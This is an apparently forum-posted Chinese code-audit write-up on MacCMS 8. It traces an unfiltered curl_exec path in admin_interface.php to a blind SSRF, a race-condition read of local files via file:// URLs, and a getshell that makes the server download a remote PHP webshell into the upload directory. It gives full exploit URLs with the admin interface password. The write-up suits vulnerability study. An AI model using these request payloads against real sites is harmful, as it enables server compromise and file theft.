MACCMS
======

好久没代码审计了，随便找了个php的源码审了好几天

虽然漏洞不是很难利用，但是这个过程真是超级有趣

无回显ssrf
=======

### 漏洞判断

日常搜索curl\_exec()函数

发现在maccms8\\inc\\common\\function.php文件的824行发现利用了该函数

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5ab9bc949524ccfd388f1a7548f3e6e47c18621e.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5ab9bc949524ccfd388f1a7548f3e6e47c18621e.png)

观察发现$ch参数由$url传入，在getPage()函数中没有任何操作对$url进行过滤

接着就反向查找哪里调用了getPage()函数

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0a3f4b053194df7975927c95c0f9c8e1363176d.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-e0a3f4b053194df7975927c95c0f9c8e1363176d.png)

发现调用该函数还挺多，挨个查找发现inc\\common\\function.php的1746行或许可以利用

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0f12120926a972ba7e24feef7d2fda551382cd7f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-0f12120926a972ba7e24feef7d2fda551382cd7f.png)

此时传入的$url函数进行了几处截断拼接操作，也没啥过滤啥的

那就继续查找savepic()函数被谁调用了

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5d37770ea635e9f0404aebfa4b456e9154e87c94.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5d37770ea635e9f0404aebfa4b456e9154e87c94.png)

乍一看也挺多的，我们只好挨个查看了

在maccms8\\admin1212\\admin\_interface.php的第452行我们发现调用了该函数

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5fd14d3093bfdfab60bc865483c2d43eba908bfa.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-5fd14d3093bfdfab60bc865483c2d43eba908bfa.png)

传入的参数是$d\_pic,慢慢往上追溯发现该参数在第66行可以通过be()函数传入

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7e3e5a5689bbe70f6b72e5881748b7de3e93b830.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-7e3e5a5689bbe70f6b72e5881748b7de3e93b830.png)

be()函数干嘛用的就不展开将了，这是该源码自己定义的函数，all表示可以通过get或post方式接收某一参数，d\_pic就是参数值

到这，算是吧这一套传参过程是给追完了，只要我们get传入d\_pic就行呗？

### 利用过程构造

我们从开头顺着看运行过程，主要是判断需要哪些条件，可以让我们运行到漏洞处

走着走着发现在48,50行有个判断

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-01f3805b4028f91ed545bd9ff6539ec3c48e51d0.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-01f3805b4028f91ed545bd9ff6539ec3c48e51d0.png)

$ac=vod和$pass是某个值，往上看，发现这俩值都可以get或post方式传入

ac好说传入vod，pass是啥啊

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1fc5941dd47b05df876a04b547a5be2df14eacdd.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1fc5941dd47b05df876a04b547a5be2df14eacdd.png)

全局搜索pass，发现是config/config.php的一个变量

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d6834c45efc37da93c751558166c479f442825a1.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d6834c45efc37da93c751558166c479f442825a1.png)

此变量是可以在后台的站外入库配置处查看的

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-048d692f8be3f493678b06ed3f7daa791f2b6eb5.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-048d692f8be3f493678b06ed3f7daa791f2b6eb5.png)

然后发现84,85行进行了判断，不能是空，一猜就是和上面相同的方法get或post传入即可

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-62a8e196ccfc7224939c68d80bf5a3bfe1a78463.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-62a8e196ccfc7224939c68d80bf5a3bfe1a78463.png)

然后在446，447行发现两个判断

```php
strpos(','.$uprule,'j')
```

```php
$MAC['collect']['vod']['pic']==1
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-33320df4e3322a67cc6bdb0faf688e2b25a78373.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-33320df4e3322a67cc6bdb0faf688e2b25a78373.png)

这是啥啊，结合上面的pass也是类似判断，我猜测也是网站的配置config.php

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-eaeebe490082dbbf4a231815a3f387bfe49bd261.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-eaeebe490082dbbf4a231815a3f387bfe49bd261.png)

需要将pic改为1，所以去后台找相关操作发现采集过程中同步图片控制该参数

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fddcd30d76d9f8a5d082852edb3758aede882603.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-fddcd30d76d9f8a5d082852edb3758aede882603.png)

我们设为开启即成为1，然后j是在二次更新规则处选择图片

### 开始利用

到这所以流程走完了，构造的url，尝试访问dnslog

```php
http://127.0.0.1/maccms8/admin1212/admin_interface.php?ac=vod&amp;pass=LMB9UVWA63&amp;d_name=1&amp;d_type=1&amp;d_pic=http://ckrooo.dnslog.cn
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-74dbf1c47f4777fd3f4994261c4b784213b4108a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-74dbf1c47f4777fd3f4994261c4b784213b4108a.png)

发现新增数据成功？这是执行了sql注入，这里是存在sql注入的（但我已经提交了），不是本文重点

再次访问一次，发现dnslog接收到访问了

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-143d6072748a17f9ef5934fb46c4efba108953aa.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-143d6072748a17f9ef5934fb46c4efba108953aa.png)

（这里我们也可以停下来思考一下这个流程，为啥访问两次才接收到dnslog数据）

到这虽然我们发现了ssrf漏洞，但是没回显啊

ssrf的各种伪协议、读源码、扫内网没法玩啊，食之无味弃之可惜

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1a40a3d1d92c77cf0f1cba6993d695d6ed8e378b.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-1a40a3d1d92c77cf0f1cba6993d695d6ed8e378b.png)

### 峰回路转

过了两天总觉得该漏洞太气人了，没回显的ssrf多气人，继续挖！

继续回去看代码，发现在inc\\common\\function.php的1749行有一个操作，写入内容到文件?峰回路转？

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d870a4f1058521f7e8b303845cfbc7b537186641.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-d870a4f1058521f7e8b303845cfbc7b537186641.png)

往下继续看，发现后面进行了判断是不是图片内容

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-15272229e5c46e4190a7497358610f0abb1d6bd9.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-15272229e5c46e4190a7497358610f0abb1d6bd9.png)

不是图片就删除该文件，你说气不气人

那就先测试一下写入图片吧

```php
http://127.0.0.1/maccms8/admin1212/admin_interface.php?ac=vod&amp;pass=LMB9UVWA63&amp;d_name=1&amp;d_type=1&amp;d_pic=http:xxx.123.png
```

发现图片被写入到了/upload/vod/2021-08-18/123.png

？？？目录可猜测？文件名是原文件名?

思考半天，突然想到一个姿势，条件竞争！

因为该源码，我们是已经成功写入到目录下了，只是后面来了个判断给删了，但利用条件竞争我们是有机会在没删之前读取该文件的。

开始构造，使用burp跑

```php
http://127.0.0.1/maccms8/admin1212/admin_interface.php?ac=vod&amp;pass=LMB9UVWA63&amp;d_name=1&amp;d_type=1&amp;d_pic=file:///c:/windows/win.ini
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-139f84525ca4cbc078cb9423aa675a6a668dfb33.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-139f84525ca4cbc078cb9423aa675a6a668dfb33.png)

```php
http://127.0.0.1/maccms8/upload/vod/2021-08-18/win.ini
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3bcf157f9cb75df16d88cef3df6772aaea79434a.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-3bcf157f9cb75df16d88cef3df6772aaea79434a.png)

两个数据开跑

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b4266b6264ee06d9352d0b15e93c59b72dcf5617.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b4266b6264ee06d9352d0b15e93c59b72dcf5617.png)

成了！

文件上传getshell
============

其实这里还是有另一个洞，就是文件上传

首先构造图片马，必须是图片马，因为文件进行了图片判断

但是，这里可以是php后缀！很离谱

```php
http://127.0.0.1/maccms8/admin1212/admin_interface.php?ac=vod&amp;pass=LMB9UVWA63&amp;d_name=10&amp;d_type=2&amp;d_pic=http://xxx/1234.php
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b2f8fd0e2d6e93fde918ee67ab324751ded0c72f.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-b2f8fd0e2d6e93fde918ee67ab324751ded0c72f.png)会将马上传到

```php
http://127.0.0.1/maccms8/upload/vod/2021-08-18/1234.php
```

成功解析

[![](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ce3f6ed3086bbb356ba29ef51ca36a9194532e4c.png)](https://shs3.b.qianxin.com/attack_forum/2021/08/attach-ce3f6ed3086bbb356ba29ef51ca36a9194532e4c.png)

总结
==

真是峰回路转啊，多思考是多么的重要

其实这个ssrf还有几处利用，比如ac=art，也是需要去后台改相应配置